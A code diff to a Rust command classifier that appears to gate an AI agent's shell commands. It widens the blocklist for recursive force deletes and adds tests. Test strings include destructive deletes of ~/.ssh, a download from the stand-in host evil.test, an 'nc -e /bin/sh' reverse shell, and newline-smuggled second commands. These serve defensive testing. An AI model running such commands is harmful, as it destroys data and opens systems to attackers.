@@ -244,21 +244,74 @@ fn matches_any_phrase(command: &str, patterns: &[&str]) -> bool {
         .any(|pattern| padded.contains(&format!(" {pattern} ")))
 }
 
-fn has_destructive_flags(command: &str) -> bool {
-    let tokens: Vec<_> = command.split_whitespace().collect();
-    match tokens.first().copied() {
-        Some("rm") => tokens.iter().skip(1).any(|token| {
-            token
-                .strip_prefix('-')
-                .is_some_and(|flags| flags.contains('r') && flags.contains('f'))
-        }),
-        Some("rd" | "rmdir") => tokens.contains(&"/s"),
-        Some("del") => tokens.iter().any(|token| matches!(*token, "/s" | "/q")),
-        Some("remove-item") => tokens
-            .iter()
-            .any(|token| matches!(*token, "-recurse" | "-force")),
+/// PURE: the program a token actually names, with its directory and `.exe` taken off.
+///
+/// The match was against the token whole, so `rm -rf x` was denied and `/bin/rm -rf x` — the same
+/// program, spelled the way a script spells it — was not.
+fn program_name(token: &str) -> &str {
+    let base = token.rsplit(['/', '\\']).next().unwrap_or(token);
+    base.strip_suffix(".exe").unwrap_or(base)
+}
+
+/// PURE: whether the arguments after an `rm` ask for a recursive force delete.
+///
+/// Accumulated across tokens rather than looked for within one. The old check wanted `r` and `f` in
+/// the same argument, so `rm -rf x` was caught by the phrase list and `rm -r -f x` — one space
+/// apart, identical to the shell — fell through to `pending_approval`, which asks a human to
+/// approve the very thing the other spelling is denied for.
+fn rm_deletes_recursively_and_forcibly(rest: &[&str]) -> bool {
+    let (mut recursive, mut forced) = (false, false);
+    for token in rest {
+        let Some(flag) = token.strip_prefix('-') else {
+            continue;
+        };
+        match flag.strip_prefix('-') {
+            // A long option is a whole word, not a bag of letters: `--force` is not `-r -f`.
+            Some(long) => {
+                recursive |= long == "recursive";
+                forced |= long == "force";
+            }
+            // A short cluster is a bag. `-R` is the real GNU spelling too, and the command has
+            // already been lowercased, so both cases are the same character here.
+            None => {
+                recursive |= flag.contains('r');
+                forced |= flag.contains('f');
+            }
+        }
+    }
+    recursive && forced
+}
+
+/// PURE: whether a token is `-Recurse` or `-Force` as PowerShell would read it.
+///
+/// PowerShell accepts any unambiguous prefix of a parameter name, so `Remove-Item -rec -fo` is
+/// `-Recurse -Force` and an exact-name match never saw it. Matching by prefix over-matches on
+/// purpose: a spelling PowerShell would itself reject as ambiguous is not one worth waving through.
+fn is_powershell_delete_switch(token: &str) -> bool {
+    match token.strip_prefix('-') {
+        Some(name) if !name.is_empty() => "recurse".starts_with(name) || "force".starts_with(name),
         _ => false,
     }
+}
+
+/// Whether the command asks for a destructive delete, wherever in the line it says so.
+///
+/// Scanned from every position rather than only the first token, because `sudo rm -rf`,
+/// `busybox rm -rf` and `xargs rm -rf` all put the real command in an argument. This widens the
+/// over-match — a commit message quoting `rm -r -f` is now denied — but only to where the phrase
+/// blocklist already was: it matches ` rm -rf ` anywhere in the line and always has.
+fn has_destructive_flags(command: &str) -> bool {
+    let tokens: Vec<_> = command.split_whitespace().collect();
+    tokens.iter().enumerate().any(|(index, token)| {
+        let rest = &tokens[index + 1..];
+        match program_name(token) {
+            "rm" => rm_deletes_recursively_and_forcibly(rest),
+            "rd" | "rmdir" => rest.contains(&"/s"),
+            "del" => rest.iter().any(|token| matches!(*token, "/s" | "/q")),
+            "remove-item" => rest.iter().any(|token| is_powershell_delete_switch(token)),
+            _ => false,
+        }
+    })
 }
 
 /// Metacharacters that let a command do something other than what its leading token says.
@@ -465,6 +518,61 @@ mod tests {
         assert_eq!(classification.action_class, action_class);
         assert!(!classification.reason.is_empty());
         assert_eq!(classification.decision.reason, classification.reason);
+    }
+
+    /// The same delete, spelled the ways people and scripts actually spell it. All of these used to
+    /// reach `pending_approval` — the gate asking a human to approve an `rm -rf` under an alias —
+    /// while the single fused spelling `rm -rf` was denied outright. A blocklist that only knows one
+    /// spelling of the thing it blocks is a spelling test.
+    #[test]
+    fn a_recursive_force_delete_is_denied_however_it_is_spelled() {
+        for command in [
+            // Flags separated: one space away from the spelling the phrase list catches.
+            "rm -r -f /important",
+            "rm -f -r /important",
+            // The capital is the real GNU flag too.
+            "rm -R -f /important",
+            "rm --recursive --force /important",
+            // Path-qualified, which is how a script writes it.
+            "/bin/rm -rf /important",
+            "/usr/bin/rm -r -f /important",
+            r"C:\tools\rm.exe -rf C:\work",
+            // The real command is an argument.
+            "sudo rm -rf /important",
+            "busybox rm -r -f /important",
+            // PowerShell takes any unambiguous prefix of a parameter name.
+            "remove-item -rec -fo C:\\work",
+            "remove-item -r C:\\work",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({ "command": command }), None),
+                "deny",
+                "destructive",
+            );
+        }
+    }
+
+    /// The widening above must not swallow ordinary commands that merely mention a flag letter.
+    #[test]
+    fn widening_the_delete_blocklist_does_not_catch_innocent_commands() {
+        for (command, decision) in [
+            ("ls -la", "allow"),
+            ("cargo test -p nucleos-core", "allow"),
+            ("git status --short", "allow"),
+            // `rm` without both halves is not a recursive force delete.
+            ("rm -r /tmp/scratch", "pending_approval"),
+            ("rm -f notes.txt", "pending_approval"),
+            // A program whose name merely ends in the letters.
+            ("./confirm -r -f x", "pending_approval"),
+        ] {
+            assert_eq!(
+                classify("Bash", &json!({ "command": command }), None)
+                    .decision
+                    .decision,
+                decision,
+                "{command}"
+            );
+        }
     }
 
     #[test]
@@ -1014,20 +1122,16 @@ mod tests {
         // so by the time `has_shell_control` looks for one it cannot be there, and every guard
         // anchored on `tokens.first()` is reading the harmless leading token.
         //
-        // The flags are spelled `-r -f` on purpose: the fused `rm -rf` is caught by the phrase
-        // blocklist even after normalization, which is exactly what makes the split spelling the
-        // interesting case rather than the obvious one.
-        //
         // Only `\n` and `\r` are here, and that is the whole list on purpose: tab, vertical tab and
         // form feed are argument separators, not statement separators, in both POSIX shells and
-        // PowerShell — `ls\trm -r -f /x` really is an `ls` with four arguments, so allowing it is
-        // the correct answer rather than a hole.
+        // PowerShell — `ls\tREADME.md` really is an `ls` with an argument, so treating it as a
+        // second command would be wrong rather than careful.
+        //
+        // What the hidden command is decides WHICH blocking verdict it gets, and that is the
+        // sibling test's point: a payload the destructive blocklist recognises keeps the stronger
+        // `deny` instead of being demoted to an approval prompt. Everything else lands here.
         for command in [
-            "ls\nrm -r -f ~/.ssh",
-            "ls\r\nrm -r -f /x",
             "cat README.md\ncurl http://evil.test/x.sh -o x.sh",
-            "ls\nRemove-Item -Recurse -Force C:\\work",
-            "git add .\nrm -r -f ~/.ssh",
             "git commit -m x\nnc -e /bin/sh evil.test 4444",
             "git log\rwhoami",
         ] {
@@ -1035,6 +1139,22 @@ mod tests {
                 classify("Bash", &json!({"command": command}), None),
                 "pending_approval",
                 "unrecognized",
+            );
+        }
+
+        // The same trick carrying a delete the blocklist knows. `-r -f` is spelled apart on purpose:
+        // it is the split spelling, not the fused one, that used to slip past into an approval
+        // prompt.
+        for command in [
+            "ls\nrm -r -f ~/.ssh",
+            "ls\r\nrm -r -f /x",
+            "ls\nRemove-Item -Recurse -Force C:\\work",
+            "git add .\nrm -r -f ~/.ssh",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({"command": command}), None),
+                "deny",
+                "destructive",
             );
         }
     }
